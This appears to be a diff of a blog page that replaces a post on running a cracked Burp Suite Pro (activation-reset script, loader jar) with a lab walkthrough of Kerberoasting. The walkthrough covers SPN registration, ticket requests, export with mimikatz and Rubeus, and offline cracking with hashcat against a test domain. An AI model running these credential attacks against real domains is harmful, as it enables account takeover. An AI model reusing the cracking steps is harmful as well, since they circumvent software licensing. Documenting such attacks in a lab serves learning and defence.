@@ -16,23 +16,26 @@
   <meta name="author" content="mifuzz">
   <meta name="keywords" content="">
   
-    <meta name="description" content="简记一次对burpsuite的更新 前言以前安装注册的BP是在国光的博客里找的教程和资源，有英文和汉化版本，版本是v2020.9.2，但是有个问题，就是光标和文字有两个文字的误差，用起来很别扭，我一直以为是版本或者汉化问题，就没有继续折腾了。今天又用到BP，实在是受不了了，打算换个新版本的BP。 我在升级BP的过程中，偶尔看到有人问显示问题，才发现以上问题是BP缩放导致的，我哭死。 资源资源链接：">
+    <meta name="description" content="前言我将使用chatGPT在前言对一些基础性知识进行解释。 需要说明，图片托管在github上，国内IP访问github资源加载速度极慢或者加载失败，请尽量使用国外IP访问。 什么是Kerberoast攻击 Kerberoast是一种用于攻击 Windows 域环境中使用的 Kerberos 身份验证协议的攻击技术。Kerberos 是一种安全的身份验证协议，用于在 Windows 域环境中进行用">
 <meta property="og:type" content="article">
-<meta property="og:title" content="简记一次对burpsuite的更新">
-<meta property="og:url" content="https://blog.dbii.top/posts/963d4df1">
+<meta property="og:title" content="Kerberoast攻击分析">
+<meta property="og:url" content="https://blog.dbii.top/posts/b244341/index.html">
 <meta property="og:site_name" content="mifuzz&#39;s blog">
-<meta property="og:description" content="简记一次对burpsuite的更新 前言以前安装注册的BP是在国光的博客里找的教程和资源，有英文和汉化版本，版本是v2020.9.2，但是有个问题，就是光标和文字有两个文字的误差，用起来很别扭，我一直以为是版本或者汉化问题，就没有继续折腾了。今天又用到BP，实在是受不了了，打算换个新版本的BP。 我在升级BP的过程中，偶尔看到有人问显示问题，才发现以上问题是BP缩放导致的，我哭死。 资源资源链接：">
+<meta property="og:description" content="前言我将使用chatGPT在前言对一些基础性知识进行解释。 需要说明，图片托管在github上，国内IP访问github资源加载速度极慢或者加载失败，请尽量使用国外IP访问。 什么是Kerberoast攻击 Kerberoast是一种用于攻击 Windows 域环境中使用的 Kerberos 身份验证协议的攻击技术。Kerberos 是一种安全的身份验证协议，用于在 Windows 域环境中进行用">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230610155157246.png">
-<meta property="article:published_time" content="2023-06-10T07:54:16.000Z">
-<meta property="article:modified_time" content="2024-03-16T14:17:26.530Z">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230529125706148.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230529125851635.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230529130759981.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230529131206163.png">
+<meta property="article:published_time" content="2023-05-29T03:29:24.000Z">
+<meta property="article:modified_time" content="2023-07-03T01:18:01.945Z">
 <meta property="article:author" content="mifuzz">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230610155157246.png">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230529125706148.png">
   
   
   
-  <title>简记一次对burpsuite的更新 - mifuzz&#39;s blog</title>
+  <title>Kerberoast攻击分析 - mifuzz&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -216,7 +219,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle">简记一次对burpsuite的更新</span>
+            <span id="subtitle">Kerberoast攻击分析</span>
           
         </div>
 
@@ -227,8 +230,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-06-10 15:54" pubdate>
-          2023年6月10日 下午
+        <time datetime="2023-05-29 11:29" pubdate>
+          2023年5月29日 上午
         </time>
       </span>
     
@@ -239,7 +242,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.1k 字
+          2.3k 字
         
       </span>
     
@@ -250,7 +253,7 @@
         
         
         
-          10 分钟
+          19 分钟
         
       </span>
     
@@ -288,30 +291,69 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">简记一次对burpsuite的更新</h1>
+            <h1 style="display: none">Kerberoast攻击分析</h1>
             
             
               <div class="markdown-body">
                 
-                <p>简记一次对burpsuite的更新</p>
-<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>以前安装注册的BP是在国光的博客里找的教程和资源，有英文和汉化版本，版本是v2020.9.2，但是有个问题，就是光标和文字有两个文字的误差，用起来很别扭，我一直以为是版本或者汉化问题，就没有继续折腾了。今天又用到BP，实在是受不了了，打算换个新版本的BP。</p>
-<p>我在升级BP的过程中，偶尔看到有人问显示问题，才发现以上问题是BP缩放导致的，我哭死。</p>
-<h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p>资源链接：<a target="_blank" rel="noopener" href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1544866">吾爱</a>，同时也十分感谢作者的无私分享！</p>
-<h2 id="激活"><a href="#激活" class="headerlink" title="激活"></a>激活</h2><p>这里看了下更新列表，选择了 BPv2022.9.2版本，下载解压，注意不要修改文件名。可阅读解压目录下的帮助文件， “说明.txt”。</p>
-<p>重置激活状态bat:</p>
-<figure class="highlight vim"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs vim">@echo off<br><span class="hljs-keyword">echo</span> Reset the activation status of burpsuite<br><span class="hljs-keyword">echo</span>.<br><span class="hljs-keyword">echo</span> deleting roaming <span class="hljs-keyword">profile</span> data..<br>rd /s /q <span class="hljs-string">"%userprofile%\AppData\Roaming\BurpSuite\"</span><br><span class="hljs-keyword">echo</span>.<br><span class="hljs-keyword">echo</span> deleting javasoft registry <span class="hljs-built_in">keys</span>..<br><span class="hljs-keyword">reg</span> <span class="hljs-keyword">delete</span> <span class="hljs-string">"HKEY_CURRENT_USER\SOFTWARE\JavaSoft\Prefs\burp"</span> /<span class="hljs-keyword">f</span><br><span class="hljs-keyword">echo</span>.<br><span class="hljs-keyword">echo</span> done!<br><span class="hljs-keyword">echo</span>.<br>pause<br></code></pre></td></tr></tbody></table></figure>
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我将使用chatGPT在前言对一些基础性知识进行解释。</p>
+<p>需要说明，图片托管在github上，国内IP访问github资源加载速度极慢或者加载失败，请尽量使用国外IP访问。</p>
+<h3 id="什么是Kerberoast攻击"><a href="#什么是Kerberoast攻击" class="headerlink" title="什么是Kerberoast攻击"></a>什么是Kerberoast攻击</h3><blockquote>
+<p>Kerberoast是一种用于攻击 Windows 域环境中使用的 Kerberos 身份验证协议的攻击技术。Kerberos 是一种安全的身份验证协议，用于在 Windows 域环境中进行用户身份验证和授权。在 Kerberos 协议中，用户会向 Kerberos 服务器请求一个安全令牌（ticket），用于在 Windows 域环境中访问资源。</p>
+<p>Kerberoast 攻击利用了 Kerberos 协议中的漏洞，通过获取 Kerberos 中的服务票据（Service Ticket），并对其进行离线攻击，从而获取到目标用户的明文密码。攻击者可以利用 Kerberoast 攻击来在不知道用户密码的情况下获取到用户的密码哈希值，然后使用密码破解工具对其进行破解，最终获取到用户的明文密码。由于攻击者可以在离线环境中进行攻击，因此 Kerberoast 攻击可以避免被 Kerberos 协议的防护机制所检测到。</p>
+</blockquote>
+<h3 id="什么是SPN"><a href="#什么是SPN" class="headerlink" title="什么是SPN"></a>什么是SPN</h3><blockquote>
+<p>SPN（Service Principal Name）是指服务主体名称，是 Kerberos 身份验证协议中用于标识服务实例的唯一标识符。SPN 通常由服务名称和主机名组成，用于标识服务在网络上的唯一实例，帮助 Kerberos 协议正确地将服务票据（Service Ticket）授予给服务实例。</p>
+<p>在 Windows 域环境中，SPN 是非常重要的，因为 Kerberos 身份验证协议是 Windows 域环境中最常用的身份验证协议。如果 SPN 配置不正确，可能会导致 Kerberos 身份验证协议无法正常工作，从而影响到整个域环境的安全和稳定性。</p>
+</blockquote>
+<h4 id="SPN的类型"><a href="#SPN的类型" class="headerlink" title="SPN的类型"></a>SPN的类型</h4><ul>
+<li>一种是注册在活动目录的机器帐户（Computers）下。当一个服务的权限为 Local System 或 Network Service 时，则 SPN 注册在机器帐户（Computers）下。</li>
+<li>另一种是注册在活动目录的域用户帐户（Users）下，当一个服务的权限为一个域用户时，则 SPN 注册在域用户帐户（Users）下。</li>
+</ul>
+<p>域环境下执行命令：<code>setspn -q */*</code>查看当前域内所有SPN，SPN分类如下：</p>
+<p>以CN开头的每一行代表一个帐户，其下的信息是与该帐户相关联的SPN,默认有三个：</p>
+<p>域控制器：CN=DC,OU=Domain Controllers,DC=fraxdeo,DC=cn</p>
+<p>域用户帐户：CN=krbtgt,CN=Users,DC=fraxdeo,DC=cn</p>
+<p>机器帐户：CN=WIN7,CN=Computers,DC=fraxdeo,DC=cn</p>
+<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz">mimikatz</a></h3><p>从内存中提取明文密码、散列、PIN 码和 kerberos 票据现在已广为人知。**<code>mimikatz</code>**还可以执行 pass-the-hash、pass-the-ticket 或 build <em>Golden tickets</em>。</p>
+<h3 id="Rubeus"><a href="#Rubeus" class="headerlink" title="Rubeus"></a><a target="_blank" rel="noopener" href="https://github.com/GhostPack/Rubeus">Rubeus</a></h3><p>Rubeus是一个 C# 工具集，是可以针对Kerberos协议进行攻击的工具,可以发起Kerberos请求,并将请求票据导入内存中,Rebeus提供了大量的用于Kerberos攻击的功能,比如TGT请求/ST请求/AS-REP Roasting攻击/Kerberoasting攻击/委派攻击/黄金票据/白银票据等。</p>
+<h3 id="Hashcat"><a href="#Hashcat" class="headerlink" title="Hashcat"></a><a target="_blank" rel="noopener" href="https://github.com/hashcat/hashcat">Hashcat</a></h3><p>hashcat工具的简介与使用可以参考：<a target="_blank" rel="noopener" href="https://goyasha.com/post/ZKgJ5d4Q/">本文</a></p>
+<hr>
+<p>工具的简介与使用互联网解释的比我好，上面工具罗列了他们的github地址，请参考</p>
+<h2 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h2><p>域控：Windows service 2016</p>
+<p>​	同时安装SQL Server 2008 R2 </p>
+<p>​	同时创建用户mssql，密码sky@1321</p>
+<h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">setspn -A MSSQLSvc/demo<span class="hljs-selector-class">.test</span><span class="hljs-selector-class">.com</span>:<span class="hljs-number">1443</span> mssql<br></code></pre></td></tr></tbody></table></figure>
 
-<p>也就是说，会删除配置文件，如果有需要，请备份C盘下%userprofile%\AppData\Roaming\BurpSuite\目录下的文件。</p>
-<p>然后就是选择解压目录下的<strong>EN-JRE Burp.bat</strong>文件来注册激活BP。资源链接里有一个激活教程。</p>
-<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>新建一个vbs文件，编辑以下内容：</p>
-<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">CreateObject</span><span class="hljs-params">(<span class="hljs-string">"WScript.Shell"</span>)</span></span><span class="hljs-selector-class">.Run</span> <span class="hljs-string">""</span><span class="hljs-string">"java"</span><span class="hljs-string">" --illegal-access=permit -Dsun.java2d.uiScale=1 -javaagent:BurpSuiteChs.jar -Dfile.encoding=utf-8 -noverify -javaagent:BurpSuiteLoader.jar -jar burpsuite_pro_org.jar"</span>, <span class="hljs-number">0</span><br></code></pre></td></tr></tbody></table></figure>
+<p>注册一条服务类为MSSQLSvc，主机为demo.test.com，端口为1433，注册在mssql域用户下</p>
+<figure class="highlight asciidoc"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">setspn -q <span class="hljs-strong">*/*</span><br></code></pre></td></tr></tbody></table></figure>
 
-<p>保存后发送快捷方式到桌面，就可以快速启动BP了。</p>
-<h3 id="参数说明："><a href="#参数说明：" class="headerlink" title="参数说明："></a>参数说明：</h3><p>-javaagent:BurpSuiteChs.jar：用于启动 BurpSuite 的汉化 jar 包</p>
-<p>-Dsun.java2d.uiScale=1：强制BurpSuite缩放比为100%</p>
-<h2 id="ISSUE"><a href="#ISSUE" class="headerlink" title="ISSUE"></a>ISSUE</h2><p>BurpSuite文本框里的光标和文字存在偏移</p>
-<h3 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h3><p>在启动BP的脚本加上参数-Dsun.java2d.uiScale=1，设置后，BP字体会很小，可以在BP的user options中的display设置字体大小。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230610155157246.png" srcset="/img/loading.gif" lazyload alt="image-20230610155157246"></p>
+<p>查看当前所有域</p>
+<figure class="highlight pgsql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Add</span>-<span class="hljs-keyword">Type</span> -AssemblyName <span class="hljs-keyword">System</span>.IdentityModel<br><span class="hljs-built_in">New</span>-<span class="hljs-keyword">Object</span> <span class="hljs-keyword">System</span>.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/demo.test.com:1443"<br></code></pre></td></tr></tbody></table></figure>
+
+<p>请求SPNKerberos票据——单个服务</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230529125706148.png" srcset="/img/loading.gif" lazyload alt="image-20230529125706148"></p>
+<figure class="highlight ebnf"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">klist</span><br></code></pre></td></tr></tbody></table></figure>
+
+<p>查看缓存中的所有票据</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230529125851635.png" srcset="/img/loading.gif" lazyload alt="image-20230529125851635"></p>
+<p>使用Rubeus和mimikatz都可以导出票据</p>
+<figure class="highlight arduino"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">kerberos::list /<span class="hljs-keyword">export</span>	<span class="hljs-comment">//mimikatz执行</span><br>Rubeus.exe kerberoast /outfile:hash.txt<br></code></pre></td></tr></tbody></table></figure>
+
+<p>mimikatz:kerberos::list /export</p>
+<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python2.<span class="hljs-number">7</span> tgsrepcrack<span class="hljs-selector-class">.py</span> zidian<span class="hljs-selector-class">.txt</span> ex.kirbi<br></code></pre></td></tr></tbody></table></figure>
+
+<p>在kali安装kerberoast，使用kerberoast的tgsrepcrack.py离线破解票据ex.kirbi</p>
+<p>rubeus:<img src="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230529130759981.png" srcset="/img/loading.gif" lazyload alt="image-20230529130759981"></p>
+<p>因为hashcat的运行模式，在虚拟机破解报错，我们在真机运行以下命令，尝试破解</p>
+<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">hashcat<span class="hljs-selector-class">.exe</span> -m <span class="hljs-number">13100</span> hash<span class="hljs-selector-class">.txt</span> ziidian.txt<br></code></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230529131206163.png" srcset="/img/loading.gif" lazyload alt="image-20230529131206163"></p>
+<p>成功，可以看到密码sky@1321</p>
+<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>注册主机名要和后面请求票据时保持一致。</p>
+<p>demo是主机名，test.com是域控网址。</p>
+<p>zidian.txt是包含密码的字典，可能不包含你设置账户的密码，可以自行添加</p>
+<p>-m 13100是破解的散列值类型，可以这篇<a target="_blank" rel="noopener" href="https://goyasha.com/post/ZKgJ5d4Q/">文章</a>选择</p>
 
                 
               </div>
@@ -330,7 +372,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%92%8C%E7%BD%91%E7%BB%9C%E6%8A%80%E8%83%BD/" class="category-chain-item">计算机和网络技能</a>
+  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="category-chain-item">内网渗透</a>
   
   
 
@@ -350,8 +392,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>简记一次对burpsuite的更新</div>
-      <div>https://blog.dbii.top/posts/963d4df1</div>
+      <div>Kerberoast攻击分析</div>
+      <div>https://blog.dbii.top/posts/b244341/</div>
     </div>
     <div class="license-meta">
       
@@ -363,13 +405,13 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年6月10日</div>
+          <div>2023年5月29日</div>
         </div>
       
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2024年3月16日</div>
+          <div>2023年7月3日</div>
         </div>
       
       
@@ -412,9 +454,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/posts/739f3d10" title="解决博客aplayer插件音乐失效问题">
+                      <a href="/posts/bbf780e8/" title="Windows 域环境的搭建">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">解决博客aplayer插件音乐失效问题</span>
+                        <span class="hidden-mobile">Windows 域环境的搭建</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -422,8 +464,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/posts/1840438d" title="记录使用pip命令的一次踩坑">
-                        <span class="hidden-mobile">记录使用pip命令的一次踩坑</span>
+                      <a href="/posts/155c2f89/" title="一台电脑SSH连接多个github账户的配置细节">
+                        <span class="hidden-mobile">一台电脑SSH连接多个github账户的配置细节</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
